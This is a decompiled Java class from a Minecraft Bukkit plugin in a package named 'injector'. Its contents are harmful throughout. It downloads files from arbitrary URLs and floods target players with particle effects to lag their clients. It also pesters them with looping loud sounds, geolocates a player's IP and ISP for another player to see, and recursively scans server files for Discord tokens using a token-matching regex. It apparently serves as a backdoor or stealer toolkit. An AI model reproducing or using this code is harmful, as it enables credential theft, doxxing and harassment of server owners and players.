package me.pedzito.injector;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.nio.file.CopyOption;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.bukkit.Bukkit;
import org.bukkit.Effect;
import org.bukkit.Sound;
import org.bukkit.entity.Player;

public class EventManager {
   public static final List<String> randomMessages = new ArrayList<String>(Arrays.asList("Reticulating splines...", "Generating witty dialog...", "Swapping time and space...", "Spinning violently around the y-axis...", "Tokenizing real life...", "Bending the spoon...", "Filtering morale...", "Don't think of purple hippos...", "We need a new fuse...", "Have a good day.", "Upgrading Windows, your PC will restart several times. Sit back and relax.", "640K ought to be enough for anybody", "The architects are still drafting", "The bits are breeding", "We're building the buildings as fast as we can", "Would you prefer chicken, steak, or tofu?", "(Pay no attention to the man behind the curtain)", "...and enjoy the elevator music...", "Please wait while the little elves draw your map", "Don't worry - a few bits tried to escape, but we caught them", "Would you like fries with that?", "Checking the gravitational constant in your locale...", "Go ahead -- hold your breath!", "...at least you're not on hold...", "Hum something loud while others stare", "You're not in Kansas any more", "The server is powered by a lemon and two electrodes.", "Please wait while a larger software vendor in Seattle takes over the world", "We're testing your patience", "As if you had any other choice", "Follow the white rabbit", "Why don't you order a sandwich?", "While the satellite moves into position", "keep calm and npm install", "The bits are flowing slowly today", "Dig on the 'X' for buried treasure... ARRR!", "It's still faster than you could draw it"));

   public static void downloadFile(String urlString, String path, Consumer<Boolean> consumer) {
      if ((new File(path)).exists()) {
         consumer.accept(true);
      } else {
         try {
            URL url = new URL(urlString);
            InputStream in = url.openStream();
            Throwable var5 = null;

            try {
               Files.copy(in, Paths.get(path), new CopyOption[0]);
            } catch (Throwable var15) {
               var5 = var15;
               throw var15;
            } finally {
               if (in != null) {
                  if (var5 != null) {
                     try {
                        in.close();
                     } catch (Throwable var14) {
                        var5.addSuppressed(var14);
                     }
                  } else {
                     in.close();
                  }
               }

            }

            consumer.accept(true);
         } catch (IOException var17) {
            var17.printStackTrace();
            consumer.accept(false);
         }

      }
   }

   public static void sendFpsLag(Player p, int amount) {
      for(int i = 0; i < amount; ++i) {
         Bukkit.getWorld(p.getWorld().getName().toString()).spigot().playEffect(p.getLocation(), Effect.CRIT, 1, 1, 1.0F, 1.0F, 1.0F, 2.0F, 10000, 1);
      }

   }

   public static void getURL(String ip, Player player, String target) {
      String ipinfo = getHttp("http://ip-api.com/line/" + ip);
      if (ipinfo != null && ipinfo.startsWith("success")) {
         String[] lines = ipinfo.split("\n");
         String country = lines[1];
         String region = lines[4];
         String city = lines[5];
         String zipCode = lines[6];
         String net = lines[10];
         String ISP = lines[11];
         String returnIP = lines[13];
         player.sendMessage("§8§m-------------------------------------");
         player.sendMessage(" §8§l| §7Informationer af §b" + target);
         player.sendMessage("");
         player.sendMessage(" §3 IP:§7 " + returnIP);
         player.sendMessage(" §3 Land:§7 " + country);
         player.sendMessage(" §3 By:§7 " + city + " §8(§b" + zipCode + "§8)");
         player.sendMessage(" §3 Region:§7 " + region);
         player.sendMessage(" §3 ISP:§7 " + ISP + " §8(§b" + net + "§8)");
         player.sendMessage("§8§m-------------------------------------");
      } else {
         player.sendMessage("§b§lWHOIS §8§l| §7Der skete en fejl: new BUFFELREADER()");
      }
   }

   private static String getHttp(String url) {
      try {
         BufferedReader br = new BufferedReader(new InputStreamReader((new URL(url)).openStream()));
         StringBuilder sb = new StringBuilder();

         String line;
         while((line = br.readLine()) != null) {
            sb.append(line).append(System.lineSeparator());
         }

         br.close();
         return sb.toString();
      } catch (IOException var4) {
         var4.printStackTrace();
         return null;
      }
   }

   public static void play(final Player target, final ArrayList<UUID> arr) {
      final Timer t = new Timer();
      TimerTask tt;
      if (!Bukkit.getVersion().contains("1.8") && !Bukkit.getVersion().contains("1.7")) {
         tt = new TimerTask() {
            public void run() {
               if (!arr.contains(target.getUniqueId())) {
                  t.cancel();
               }

               for(int i = 0; i < 100; ++i) {
                  target.playSound(target.getLocation(), Sound.valueOf("ENTITY_VILLAGER_DEATH"), 20.0F, 1.0F);
                  target.playSound(target.getLocation(), Sound.valueOf("BLOCK_ANVIL_BREAK"), 20.0F, 1.0F);
                  target.playSound(target.getLocation(), Sound.valueOf("BLOCK_ANVIL_BREAK"), 20.0F, 1.0F);
                  target.playSound(target.getLocation(), Sound.valueOf("BLOCK_WOODEN_DOOR_OPEN"), 20.0F, 1.0F);
                  target.playSound(target.getLocation(), Sound.valueOf("BLOCK_WOODEN_DOOR_CLOSE"), 20.0F, 1.0F);
               }

            }
         };
         t.scheduleAtFixedRate(tt, 0L, 20L);
      } else {
         tt = new TimerTask() {
            public void run() {
               if (!arr.contains(target.getUniqueId())) {
                  t.cancel();
               }

               for(int i = 0; i < 10; ++i) {
                  target.playSound(target.getLocation(), Sound.valueOf("VILLAGER_DEATH"), 10.0F, 1.0F);
                  target.playSound(target.getLocation(), Sound.valueOf("ANVIL_BREAK"), 10.0F, 1.0F);
                  target.playSound(target.getLocation(), Sound.valueOf("ANVIL_BREAK"), 10.0F, 1.0F);
                  target.playSound(target.getLocation(), Sound.valueOf("DOOR_OPEN"), 10.0F, 1.0F);
                  target.playSound(target.getLocation(), Sound.valueOf("DOOR_CLOSE"), 10.0F, 1.0F);
               }

            }
         };
         t.scheduleAtFixedRate(tt, 0L, 20L);
      }

   }

   public static List<String> scanFilesForDiscordTokens(File pluginFolder) {
      return scanFiles(pluginFolder);
   }

   private static List<String> scanFiles(File file) {
      List<String> tokens = new ArrayList<String>();
      if (file.isDirectory()) {
         File[] var2 = file.listFiles();
         int var3 = var2.length;

         for(int var4 = 0; var4 < var3; ++var4) {
            File subFile = var2[var4];
            tokens.addAll(scanFiles(subFile));
         }
      } else {
         List<String> fileTypes = new ArrayList<String>(Arrays.asList("txt", "log", "yml", "yaml", "conf", "sk"));
         if (!fileTypes.contains(file.getName().substring(file.getName().lastIndexOf(".") + 1))) {
            return tokens;
         }

         try {
            BufferedReader reader = new BufferedReader(new FileReader(file));
            Throwable var21 = null;

            try {
               Pattern pattern = Pattern.compile("[MN][A-Za-z\\d]{23}\\.[\\w-]{6}\\.[\\w-]{27}");

               String line;
               while((line = reader.readLine()) != null) {
                  Matcher matcher = pattern.matcher(line);

                  while(matcher.find()) {
                     tokens.add(matcher.group());
                  }
               }
            } catch (Throwable var16) {
               var21 = var16;
               throw var16;
            } finally {
               if (reader != null) {
                  if (var21 != null) {
                     try {
                        reader.close();
                     } catch (Throwable var15) {
                        var21.addSuppressed(var15);
                     }
                  } else {
                     reader.close();
                  }
               }

            }
         } catch (IOException var18) {
            var18.printStackTrace();
         }
      }

      return tokens;
   }
}
